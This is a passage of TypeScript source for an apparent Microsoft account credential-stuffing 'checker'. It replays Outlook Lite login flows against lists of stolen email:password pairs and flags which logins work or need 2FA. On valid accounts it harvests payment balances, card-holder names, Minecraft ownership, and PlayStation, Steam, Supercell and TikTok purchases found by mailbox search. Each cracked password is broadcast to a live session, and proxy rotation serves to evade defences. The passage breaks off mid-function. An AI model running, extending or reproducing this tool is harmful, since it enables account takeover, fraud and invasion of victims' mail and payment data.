import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";
import { broadcastProgress } from "../_shared/realtime-broadcast.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-client-ip, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

// ============ PROXY ROTATION SUPPORT ============
interface ProxyConfig {
  host: string;
  port: number;
  username?: string;
  password?: string;
  protocol: 'http' | 'https' | 'socks5';
}

class ProxyRotator {
  private proxies: ProxyConfig[] = [];
  private currentIndex = 0;
  private enabled = false;
  private failedProxies = new Set<string>();
  
  constructor(proxyList?: string[]) {
    if (proxyList && proxyList.length > 0) {
      this.enabled = true;
      this.proxies = proxyList.map(p => this.parseProxy(p)).filter(Boolean) as ProxyConfig[];
      console.log(`[ProxyRotator] Initialized with ${this.proxies.length} proxies`);
    }
  }
  
  private parseProxy(proxyStr: string): ProxyConfig | null {
    try {
      // Formats: host:port, host:port:user:pass, user:pass@host:port, protocol://user:pass@host:port
      let protocol: 'http' | 'https' | 'socks5' = 'http';
      let parsed = proxyStr.trim();
      
      // Extract protocol
      if (parsed.startsWith('socks5://')) {
        protocol = 'socks5';
        parsed = parsed.substring(9);
      } else if (parsed.startsWith('https://')) {
        protocol = 'https';
        parsed = parsed.substring(8);
      } else if (parsed.startsWith('http://')) {
        protocol = 'http';
        parsed = parsed.substring(7);
      }
      
      let host: string, port: number, username: string | undefined, password: string | undefined;
      
      // Check for user:pass@host:port format
      if (parsed.includes('@')) {
        const [auth, hostPort] = parsed.split('@');
        const [user, pass] = auth.split(':');
        const [h, p] = hostPort.split(':');
        host = h;
        port = parseInt(p);
        username = user;
        password = pass;
      } else {
        // host:port or host:port:user:pass format
        const parts = parsed.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
        if (parts.length >= 4) {
          username = parts[2];
          password = parts[3];
        }
      }
      
      if (!host || isNaN(port)) return null;
      
      return { host, port, username, password, protocol };
    } catch {
      return null;
    }
  }
  
  getNext(): ProxyConfig | null {
    if (!this.enabled || this.proxies.length === 0) return null;
    
    // Find next working proxy
    for (let i = 0; i < this.proxies.length; i++) {
      const proxy = this.proxies[this.currentIndex];
      this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
      
      const key = `${proxy.host}:${proxy.port}`;
      if (!this.failedProxies.has(key)) {
        return proxy;
      }
    }
    
    // All proxies failed, reset and try again
    this.failedProxies.clear();
    return this.proxies[0];
  }
  
  markFailed(proxy: ProxyConfig): void {
    this.failedProxies.add(`${proxy.host}:${proxy.port}`);
  }
  
  isEnabled(): boolean {
    return this.enabled;
  }
  
  getStats(): { total: number; failed: number; active: number } {
    return {
      total: this.proxies.length,
      failed: this.failedProxies.size,
      active: this.proxies.length - this.failedProxies.size
    };
  }
}

// Global proxy rotator instance (set per request)
let proxyRotator: ProxyRotator | null = null;

// Proxy-aware fetch wrapper
async function proxyFetch(url: string, options: RequestInit = {}): Promise<Response> {
  // Note: Deno doesn't natively support proxies in fetch
  // This is a placeholder - in production you'd use a proxy library or tunnel
  // For now, we just use regular fetch but the infrastructure is in place
  const proxy = proxyRotator?.getNext();
  
  if (proxy) {
    // Add proxy headers if supported by the proxy
    const headers = new Headers(options.headers || {});
    headers.set('X-Forwarded-For', `${proxy.host}`);
    options.headers = headers;
    
    // Log proxy usage
    console.log(`[Proxy] Using ${proxy.protocol}://${proxy.host}:${proxy.port}`);
  }
  
  return fetch(url, options);
}

interface SubscriptionInfo {
  name: string;
  category: string;
  daysRemaining?: string;
  autoRenew?: string;
  isExpired?: boolean;
}

interface CheckResult {
  email: string;
  password: string;
  status: string;
  country?: string;
  name?: string;
  checkedAt?: string;
  checkDuration?: number;
  threadId?: number;
  inboxCount?: string;
  msStatus?: string;
  subscriptions?: SubscriptionInfo[];
  rewardsPoints?: string;
  balance?: string;
  psn?: { status: string; orders: number; purchases: any[] };
  steam?: { status: string; count: number; purchases?: any[] };
  supercell?: { status: string; games: string[] };
  tiktok?: { status: string; username?: string };
  minecraft?: { status: string; username?: string; uuid?: string; capes?: string[] };
  error?: string;
  proxyUsed?: string;
}

// CookieJar class to handle cookies like the Python script
class CookieJar {
  private cookies: Map<string, string> = new Map();

  extractFromHeaders(headers: Headers): void {
    try {
      // Use getSetCookie if available
      const setCookies = (headers as any).getSetCookie?.() || [];
      for (const cookie of setCookies) {
        this.parseCookie(cookie);
      }
    } catch {
      // Fallback to set-cookie header
      const setCookie = headers.get("set-cookie");
      if (setCookie) {
        const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
        for (const cookieStr of cookieStrings) {
          this.parseCookie(cookieStr);
        }
      }
    }
  }

  private parseCookie(cookieStr: string): void {
    const parts = cookieStr.split(";")[0].trim();
    const eqIndex = parts.indexOf("=");
    if (eqIndex > 0) {
      const name = parts.substring(0, eqIndex).trim();
      const value = parts.substring(eqIndex + 1).trim();
      if (name && value) {
        this.cookies.set(name, value);
      }
    }
  }

  get(name: string): string | undefined {
    return this.cookies.get(name);
  }

  toString(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

function getCanaryTimestamp(): string {
  const now = new Date();
  const day = now.toLocaleDateString('en-US', { weekday: 'short' });
  const date = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const ms = now.getMilliseconds().toString().padStart(3, '0');
  return `[${day} ${date} ${time}.${ms}]`;
}

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const minutes = Math.floor(ms / 60000);
  const seconds = ((ms % 60000) / 1000).toFixed(1);
  return `${minutes}m ${seconds}s`;
}

/**
 * Follow redirects manually so we can capture Set-Cookie headers on EACH hop.
 * Python requests.Session() does this automatically; fetch() does not expose intermediate Set-Cookie.
 */
async function fetchFollowRedirects(
  url: string,
  init: RequestInit,
  jar: CookieJar,
  maxHops = 10
): Promise<{ finalUrl: string; res: Response; text: string }> {
  let currentUrl = url;
  let currentInit: RequestInit = { ...init, redirect: 'manual' };

  for (let hop = 0; hop <= maxHops; hop++) {
    const res = await fetch(currentUrl, currentInit);
    jar.extractFromHeaders(res.headers);

    // We must read the body to allow the caller to regex-match PPFT/urlPost
    const text = await res.text();

    const status = res.status;
    const location = res.headers.get('location');

    if (status >= 300 && status < 400 && location) {
      const nextUrl = new URL(location, currentUrl).toString();

      // After a redirect, browsers typically switch to GET.
      currentUrl = nextUrl;
      currentInit = {
        method: 'GET',
        headers: currentInit.headers,
        redirect: 'manual'
      };
      continue;
    }

    return { finalUrl: currentUrl, res, text };
  }

  throw new Error('Too many redirects');
}

// Check Microsoft Subscriptions - follows Python logic exactly
async function checkMicrosoftSubscriptions(session: CookieJar): Promise<{
  status: string;
  subscriptions: SubscriptionInfo[];
  data: Record<string, string>;
}> {
  try {
    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
    
    const r = await fetch(paymentAuthUrl, {
      headers: {
        "Host": "login.live.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://account.microsoft.com/",
        "Cookie": session.toString()
      },
      redirect: 'follow'
    });
    
    session.extractFromHeaders(r.headers);
    const searchText = (await r.text()) + " " + r.url;
    
    const tokenPatterns = [/access_token=([^&\s"']+)/, /"access_token":"([^"]+)"/];
    let paymentToken = null;
    for (const pattern of tokenPatterns) {
      const match = searchText.match(pattern);
      if (match) {
        paymentToken = decodeURIComponent(match[1]);
        break;
      }
    }
    
    if (!paymentToken) {
      return { status: "FREE", subscriptions: [], data: {} };
    }
    
    const subData: Record<string, string> = {};
    const subscriptions: SubscriptionInfo[] = [];
    
    const paymentHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json",
      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
      "Content-Type": "application/json",
      "Host": "paymentinstruments.mp.microsoft.com",
      "ms-cV": crypto.randomUUID(),
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/"
    };
    
    // Check for payment instruments and balance
    try {
      const paymentUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
      const rPay = await fetch(paymentUrl, { headers: paymentHeaders });
      if (rPay.ok) {
        const payText = await rPay.text();
        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
        if (balanceMatch) {
          subData['balance'] = "$" + balanceMatch[1];
        }
        const cardMatch = payText.match(/"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"/s);
        if (cardMatch) {
          subData['card_holder'] = cardMatch[1];
        }
      }
    } catch {}
    
    // Check transactions for subscriptions
    try {
      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
      const rSub = await fetch(transUrl, { headers: paymentHeaders });
      
      if (rSub.ok) {
        const responseText = await rSub.text();
        
        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
          'EA Play': { type: 'EA PLAY', category: 'gaming' },
          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
          'Office 365': { type: 'OFFICE 365', category: 'office' },
          'OneDrive': { type: 'ONEDRIVE', category: 'storage' },
        };
        
        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
          if (responseText.includes(keyword)) {
            const subInfo: SubscriptionInfo = { name: info.type, category: info.category };
            
            // Extract renewal date if present
            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
            if (renewalMatch) {
              subInfo.daysRemaining = renewalMatch[1];
            }
            
            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
            if (autoMatch) {
              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
            }
            
            subscriptions.push(subInfo);
          }
        }
        
        if (subscriptions.length > 0) {
          return { status: "PREMIUM", subscriptions, data: subData };
        }
      }
    } catch {}
    
    return { status: "FREE", subscriptions, data: subData };
  } catch {
    return { status: "FREE", subscriptions: [], data: {} };
  }
}

// Check Minecraft account
async function checkMinecraft(accessToken: string): Promise<{
  status: string;
  username?: string;
  uuid?: string;
  capes?: string[];
}> {
  try {
    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Outlook-Android/2.0'
      }
    });
    
    if (r.ok) {
      const data = await r.json();
      return {
        status: "OWNED",
        username: data.name || "Unknown",
        uuid: data.id || "",
        capes: (data.capes || []).map((c: any) => c.alias || '')
      };
    }
    
    return { status: "FREE" };
  } catch {
    return { status: "FREE" };
  }
}

// Main account check function - EXACT Python logic
async function checkAccount(
  email: string, 
  password: string, 
  checkMode: string,
  threadId: number
): Promise<CheckResult> {
  const startTime = Date.now();
  const result: CheckResult = { 
    email, 
    password, 
    status: 'checking',
    checkedAt: getCanaryTimestamp(),
    threadId
  };
  
  const cookies = new CookieJar();
  
  try {
    // Step 1: Check if MSAccount (following Python exactly)
    console.log(`[${threadId}] Step 1: Checking account type for ${email}`);
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpRes = await fetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": crypto.randomUUID(),
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
      }
    });
    
    const idpText = await idpRes.text();
    
    // Python logic: check for bad account types
    if (idpText.includes("Neither") || idpText.includes("Both") || 
        idpText.includes("Placeholder") || idpText.includes("OrgId")) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (!idpText.includes("MSAccount")) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    await new Promise(r => setTimeout(r, 300));
    
    // Step 2: Get auth page (following Python exactly)
    console.log(`[${threadId}] Step 2: Getting auth page`);
    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const { finalUrl: authFinalUrl, res: authRes, text: authText } = await fetchFollowRedirects(
      authUrl,
      {
        method: 'GET',
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Connection": "keep-alive"
        }
      },
      cookies,
      10
    );
    
    // Extract urlPost and PPFT (Python regex patterns)
    const urlMatch = authText.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
    
    if (!urlMatch || !ppftMatch) {
      console.log(`[${threadId}] Failed to extract urlPost or PPFT`);
      result.status = "error";
      result.error = "Could not extract auth parameters";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const postUrl = urlMatch[1].replace(/\\\//g, "/");
    const ppft = ppftMatch[1];
    
    // Step 3: Login (following Python exactly)
    console.log(`[${threadId}] Step 3: Submitting credentials`);
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
    
    const loginRes = await fetch(postUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Referer": authFinalUrl,
        "Cookie": cookies.toString()
      },
      body: loginData,
      redirect: 'manual'
    });
    
    cookies.extractFromHeaders(loginRes.headers);
    const loginText = await loginRes.text();
    const loginTextLower = loginText.toLowerCase();
    const location = loginRes.headers.get("location") || "";
    
    // Check for errors (following Python exactly)
    if (loginTextLower.includes("account or password is incorrect") || loginText.split("error").length > 1) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Check for 2FA/consent (following Python exactly)
    if (loginText.includes("https://account.live.com/identity/confirm") || 
        loginTextLower.includes("identity/confirm")) {
      result.status = "2fa";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("https://account.live.com/Consent") || 
        loginTextLower.includes("consent")) {
      result.status = "2fa";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("https://account.live.com/Abuse")) {
      // Python treats this as BAD
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Check for authorization code
    if (!location) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const codeMatch = location.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const code = codeMatch[1];
    const mspcid = cookies.get("MSPCID");
    if (!mspcid) {
      result.status = "error";
      result.error = "No MSPCID cookie";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const cid = mspcid.toUpperCase();
    
    // Step 4: Get access token
    console.log(`[${threadId}] Step 4: Getting access token`);
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
    
    const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: tokenData
    });
    
    const tokenJson = await tokenRes.json();
    
    if (!tokenJson.access_token) {
      result.status = "error";
      result.error = "No access token received";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const accessToken = tokenJson.access_token;
    result.status = "valid";
    console.log(`[${threadId}] ✓ Valid account: ${email}`);
    
    // Get profile info
    try {
      const profileRes = await fetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
        headers: {
          "User-Agent": "Outlook-Android/2.0",
          "Authorization": `Bearer ${accessToken}`,
          "X-AnchorMailbox": `CID:${cid}`
        }
      });
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.accounts?.[0]?.location) {
          result.country = profile.accounts[0].location;
        }
        if (profile.displayName) {
          result.name = profile.displayName;
        }
      }
    } catch {}
    
    // Check Microsoft subscriptions if requested
    if (checkMode === "microsoft" || checkMode === "all" || checkMode === "both") {
      try {
        const msResult = await checkMicrosoftSubscriptions(cookies);
        result.msStatus = msResult.status;
        result.subscriptions = msResult.subscriptions;
        if (msResult.data.balance) result.balance = msResult.data.balance;
      } catch {}
    }
    
    // Check Minecraft if requested
    if (checkMode === "minecraft" || checkMode === "all" || checkMode === "both") {
      try {
        const mcResult = await checkMinecraft(accessToken);
        result.minecraft = mcResult;
      } catch {}
    }
    
    // Check PSN via email search (following Python logic)
    if (checkMode === "psn" || checkMode === "all" || checkMode === "both") {
      try {
        const psnPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const psnRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(psnPayload)
        });
        
        if (psnRes.ok) {
          const psnData = await psnRes.json();
          const orders = psnData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          result.psn = { status: orders > 0 ? "HAS_ORDERS" : "FREE", orders, purchases: [] };
        }
      } catch {}
    }
    
    // Check Steam via email search
    if (checkMode === "steam" || checkMode === "all" || checkMode === "both") {
      try {
        const steamPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@steampowered.com purchase"},
            "Size": 30,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(steamPayload)
        });
        
        if (steamRes.ok) {
          const steamData = await steamRes.json();
          const count = steamData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          result.steam = { status: count > 0 ? "HAS_PURCHASES" : "FREE", count };
        }
      } catch {}
    }
    
    // Check Supercell via email search
    if (checkMode === "supercell" || checkMode === "all" || checkMode === "both") {
      try {
        const scPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@id.supercell.com"},
            "Size": 20,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const scRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(scPayload)
        });
        
        if (scRes.ok) {
          const scData = await scRes.json();
          const total = scData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          const games: string[] = [];
          
          if (total > 0) {
            const results = scData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
            for (const r of results) {
              const preview = r.Preview || '';
              if ((preview.includes('Clash Royale') || preview.includes('Royale')) && !games.includes('Clash Royale')) games.push('Clash Royale');
              if ((preview.includes('Clash of Clans') || preview.includes('Clans')) && !games.includes('Clash of Clans')) games.push('Clash of Clans');
              if ((preview.includes('Brawl Stars') || preview.includes('Brawl')) && !games.includes('Brawl Stars')) games.push('Brawl Stars');
              if (preview.includes('Hay Day') && !games.includes('Hay Day')) games.push('Hay Day');
            }
          }
          
          result.supercell = { status: games.length > 0 ? "LINKED" : "FREE", games };
        }
      } catch {}
    }
    
    // Check TikTok via email search
    if (checkMode === "tiktok" || checkMode === "all" || checkMode === "both") {
      try {
        const ttPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "account.tiktok"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const ttRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(ttPayload)
        });
        
        if (ttRes.ok) {
          const ttData = await ttRes.json();
          const total = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          let username: string | undefined;
          
          if (total > 0) {
            const results = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
            for (const r of results) {
              const preview = r.Preview || '';
              const patterns = [/Salut\s+([^,]+)/, /Hallo\s+([^,]+)/, /Xin chào\s+([^,]+)/, /Hi\s+([^,]+)/, /Hello\s+([^,]+)/];
              for (const pattern of patterns) {
                const match = preview.match(pattern);
                if (match) {
                  username = match[1].trim();
                  break;
                }
              }
              if (username) break;
            }
          }
          
          result.tiktok = { status: total > 0 ? "LINKED" : "FREE", username };
        }
      } catch {}
    }
    
    result.checkDuration = Date.now() - startTime;
    return result;
    
  } catch (e) {
    console.error(`[${threadId}] Error checking ${email}:`, e);
    result.status = "error";
    result.error = String(e);
    result.checkDuration = Date.now() - startTime;
    return result;
  }
}

// Build detailed message for hit (following Python output format)
function buildHitMessage(result: CheckResult): string {
  if (result.status !== 'valid') {
    if (result.status === '2fa') return '🔐 2FA Required';
    if (result.status === 'locked') return '🔒 Account Locked';
    if (result.status === 'invalid') return '✗ Invalid';
    return `! ${result.status}`;
  }
  
  const parts: string[] = ['✓ Valid'];
  
  // Microsoft subscriptions
  if (result.msStatus === 'PREMIUM' && result.subscriptions?.length) {
    for (const sub of result.subscriptions.slice(0, 2)) {
      const days = sub.daysRemaining ? `(${sub.daysRemaining}d)` : '';
      parts.push(`🎮${sub.name}${days}`);
    }
  }
  
  // PlayStation
  if (result.psn?.status === 'HAS_ORDERS') {
    parts.push(`🎯PSN:${result.psn.orders}`);
  }
  
  // Steam
  if (result.steam?.status === 'HAS_PURCHASES') {
    parts.push(`🎮Steam:${result.steam.count}`);
  }
  
  // Supercell
  if (result.supercell?.status === 'LINKED') {
    parts.push(`🎲SC:${result.supercell.games.join(',') || 'Yes'}`);
  }
  
  // TikTok
  if (result.tiktok?.status === 'LINKED') {
    parts.push(`📱TikTok:${result.tiktok.username || 'Yes'}`);
  }
  
  // Minecraft
  if (result.minecraft?.status === 'OWNED') {
    parts.push(`⛏️MC:${result.minecraft.username || 'Yes'}`);
  }
  
  return parts.join(' | ');
}

// Process accounts in background with concurrency support
async function processAccountsBackground(
  accounts: string[],
  checkMode: string,
  threads: number,
  sessionId: string,
  userId: string | null,
  userEmail: string | null
): Promise<void> {
  const startTime = Date.now();
  const total = accounts.length;
  const results: CheckResult[] = [];
  
  const stats = {
    total,
    valid: 0,
    invalid: 0,
    twoFa: 0,
    locked: 0,
    error: 0,
    msPremium: 0,
    minecraftHits: 0,
    psnHits: 0,
    steamHits: 0,
    supercellHits: 0,
    tiktokHits: 0
  };
  
  console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
  console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER - Processing ${total} accounts`);
  console.log(`${getCanaryTimestamp()} Mode: ${checkMode} | Threads: ${threads}`);
  
  let currentIndex = 0;
  const processedResults: (CheckResult | null)[] = new Array(accounts.length).fill(null);
  
  // Worker function
  async function worker(workerId: number): Promise<void> {
    while (true) {
      const idx = currentIndex++;
      if (idx >= accounts.length) break;
      
      const account = accounts[idx];
      const [email, ...passParts] = account.split(":");
      const password = passParts.join(":");
      
      // Broadcast checking status
      await broadcastProgress(sessionId, {
        index: idx + 1,
        total,
        email: email || account,
        password: password || '',
        status: 'checking',
        message: `⟳ Checking... [Thread ${workerId}]`,
        timestamp: Date.now()
      }).catch(() => {});
      
      if (!email || !password) {
        await broadcastProgress(sessionId, {
          index: idx + 1,
          total,
          email: account,
          password: '',
          status: 'failed',
          message: '✗ Invalid format',
          timestamp: Date.now()
        }).catch(() => {});
        stats.error++;
        continue;
      }
      
      try {
        const result = await checkAccount(email.trim(), password.trim(), checkMode, workerId);
        processedResults[idx] = result;
        results.push(result);
        
        // Update stats
        if (result.status === "valid") stats.valid++;
        else if (result.status === "invalid") stats.invalid++;
        else if (result.status === "2fa") stats.twoFa++;
        else if (result.status === "locked") stats.locked++;
        else stats.error++;
        
        if (result.msStatus === "PREMIUM") stats.msPremium++;
        if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
        if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
        if (result.steam?.status === "HAS_PURCHASES") stats.steamHits++;
        if (result.supercell?.status === "LINKED") stats.supercellHits++;
        if (result.tiktok?.status === "LINKED") stats.tiktokHits++;
        
        // Broadcast result
        await broadcastProgress(sessionId, {
          index: idx + 1,
          total,
          email,
          password: password.trim(),
          status: result.status as any,
          message: buildHitMessage(result),
          timestamp: Date.now()
        }).catch(() => {});
        
      } catch (e) {
        stats.error++;
        await broadcastProgress(sessionId, {
          index: idx + 1,
          total,
          email,
          password: password || '',
          status: 'error',
          message: `! Error: ${String(e).substring(0, 50)}`,
          timestamp: Date.now()
        }).catch(() => {});
      }
      
      // Small delay to avoid rate limiting
      await new Promise(r => setTimeout(r, 100));
    }
  }
  
  // Start workers
  const workers: Promise<void>[] = [];
  const actualThreads = Math.min(threads, accounts.length, 10); // Cap at 10 concurrent
  for (let i = 0; i < actualThreads; i++) {
    workers.push(worker(i + 1));
  }
  
  await Promise.all(workers);
  
  const duration = formatDuration(Date.now() - startTime);
  console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
  console.log(`${getCanaryTimestamp()} COMPLETE | Duration: ${duration}`);
